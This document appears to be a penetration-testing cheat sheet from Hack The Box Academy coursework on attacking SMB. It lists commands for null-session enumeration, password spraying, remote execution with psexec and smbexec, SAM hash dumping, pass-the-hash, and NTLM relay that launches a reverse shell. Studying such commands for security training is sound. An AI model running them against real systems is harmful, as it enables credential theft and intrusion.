# SMB

**Refs**

- [Section](https://academy.hackthebox.com/module/116/section/1167)
- [Latest Vulnerabilities](https://academy.hackthebox.com/module/116/section/1168)
- [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796)
- [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
- [Complete cheatsheet](finals\SMB-Access-from-Linux.pdf)

## Attacking SMB

| **Command** | **Description** |
| ---- | ---- |
| **smbclient** |  |
| `smbclient -N -L //<FQDN/IP>` | Null-session testing against the SMB service. |
| `smbclient -U <user>%<password> \\<FQDN/IP>` | Access with password |
| **smbmap** |  |
| `smbmap -H <FQDN/IP>` | Network share enumeration using `smbmap`. |
| `smbmap -H <FQDN/IP> -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H <FQDN/IP> --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H <FQDN/IP> --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| **enumeration** |  |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| **RCE** |  |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth` | Password spraying against different local users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `smbexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |
| `sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance` | To mount a drive with no domain |

### To mount in windows

***Ref***: <https://vk9-sec.com/smb-server-with-impaket-smbserver/>
```ps1
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```
